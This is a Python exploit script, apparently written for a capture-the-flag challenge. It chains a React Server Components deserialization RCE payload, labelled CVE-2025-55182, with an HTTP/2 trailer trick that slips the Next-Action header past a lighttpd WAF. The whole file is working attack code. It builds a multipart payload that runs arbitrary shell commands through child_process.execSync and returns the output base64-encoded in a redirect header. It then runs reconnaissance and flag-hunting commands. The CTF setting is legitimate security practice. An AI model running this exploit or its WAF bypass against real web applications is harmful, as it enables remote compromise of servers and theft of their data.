#!/usr/bin/env python3
"""
Final exploit: React2Shell + HTTP/2 Trailers WAF bypass
Combines CVE-2025-55182 RCE payload with H2 trailer transport to bypass lighttpd WAF
"""
import socket
import ssl
import struct
import time
import base64
import re
from urllib.parse import unquote
from hpack import Encoder
from hyperframe.frame import HeadersFrame, DataFrame

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

# Read current action ID
with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def open_h2():
    """Open HTTP/2 TLS connection"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
    sock.sendall(PREFACE)

    # Send empty SETTINGS frame
    settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    sock.sendall(settings_frame)

    return sock

def read_frames(sock, want_stream=1, max_time=10):
    """Read HTTP/2 frames until END_STREAM"""
    frames = []
    end_time = time.time() + max_time

    while time.time() < end_time:
        try:
            # Read frame header (9 bytes)
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            # Read frame payload
            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            frames.append((frame_type, flags, stream_id, payload))

            # Check for END_STREAM (flags & 1)
            if stream_id == want_stream and (flags & 1):
                break

        except socket.timeout:
            break
        except Exception as e:
            print(f"Frame read error: {e}")
            break

    return frames, True

def parse_response(frames):
    """Parse HTTP/2 response frames"""
    headers = {}
    body = b""
    status = None

    for frame_type, flags, stream_id, payload in frames:
        if frame_type == 1:  # HEADERS
            # Simple header parsing - look for status
            if b":status" in payload:
                # Extract status code
                try:
                    status_match = re.search(rb':status\x03(\d{3})', payload)
                    if status_match:
                        status = status_match.group(1).decode()
                except:
                    pass

            # Look for location header
            if b"location" in payload:
                try:
                    loc_match = re.search(rb'location[^\x00]*\x00([^\x00]+)', payload)
                    if loc_match:
                        headers["location"] = loc_match.group(1).decode()
                except:
                    pass

        elif frame_type == 0:  # DATA
            body += payload

    return status or "200", headers, body

def build_react2shell_payload(cmd):
    """Build React2Shell CVE-2025-55182 payload as multipart form"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    cmd_escaped = cmd.replace("'", "\\'")

    # Core RCE Logic - same as React2Shell
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts).encode()
    content_type = f"multipart/form-data; boundary={boundary}"

    return body, content_type

def send_exploit(command):
    """Send exploit via HTTP/2 trailers"""
    sock = open_h2()
    sid = 1

    # Consume settings ACK
    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Build React2Shell payload
    body, content_type = build_react2shell_payload(command)

    # Prepare headers WITHOUT Next-Action
    enc = Encoder()
    header_block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body))),
        ("trailer", "next-action"),  # Announce trailer
        ("user-agent", "final-exploit"),
    ])

    # Prepare trailer with Next-Action
    trailer_block = enc.encode([
        ("next-action", ACTION_ID),
    ])

    # Send HEADERS frame (NO END_STREAM)
    raw = struct.pack(">I", len(header_block))[1:] + b"\x01" + b"\x04" + struct.pack(">I", sid) + header_block
    sock.sendall(raw)

    # Send DATA frame (NO END_STREAM)
    raw = struct.pack(">I", len(body))[1:] + b"\x00" + b"\x00" + struct.pack(">I", sid) + body
    sock.sendall(raw)

    # Send HEADERS frame as trailer (END_HEADERS + END_STREAM)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + b"\x05" + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    # Read response
    frames, end = read_frames(sock, want_stream=sid, max_time=15)
    sock.close()

    return parse_response(frames)

def extract_result(status, headers, body):
    """Extract command output from response"""
    # Check Location header first (redirect response)
    location = headers.get("location", "")
    if location:
        match = re.search(r'/login\?a=([^;]+)', location)
        if match:
            try:
                output_b64 = unquote(match.group(1))
                decoded = base64.b64decode(output_b64).decode('utf-8', errors='ignore')
                return decoded.strip()
            except Exception as e:
                return f"Decode error: {e}"

    # Check body for any useful info
    body_str = body.decode('utf-8', errors='ignore')
    if "recovery-offline" in body_str:
        return "Action executed but returned recovery-offline (old behavior)"

    return f"No output found. Status: {status}, Headers: {headers}"

def main():
    print("=" * 60)
    print("React2Shell + HTTP/2 Trailers WAF Bypass")
    print("=" * 60)

    # Test command to verify RCE
    test_cmd = "id && pwd && ls -la /"

    print(f"[+] Executing command: {test_cmd}")
    print("[+] Sending exploit...")

    try:
        status, headers, body = send_exploit(test_cmd)
        print(f"[+] Response status: {status}")

        result = extract_result(status, headers, body)
        print(f"[+] Command output:")
        print("-" * 40)
        print(result)
        print("-" * 40)

        # If successful, look for flag
        if "uid=" in result or "root" in result:
            print("\n[+] RCE confirmed! Looking for flag...")
            flag_cmd = "find / -name '*flag*' -type f 2>/dev/null | head -10"

            status2, headers2, body2 = send_exploit(flag_cmd)
            flag_result = extract_result(status2, headers2, body2)
            print(f"[+] Flag search result:")
            print(flag_result)

            # Try common flag locations
            for flag_path in ["/flag", "/flag.txt", "/root/flag", "/app/flag", "/home/flag"]:
                cat_cmd = f"cat {flag_path} 2>/dev/null"
                status3, headers3, body3 = send_exploit(cat_cmd)
                cat_result = extract_result(status3, headers3, body3)
                if cat_result and "alfa{" in cat_result:
                    print(f"\n[!] FLAG FOUND: {cat_result}")
                    break

    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()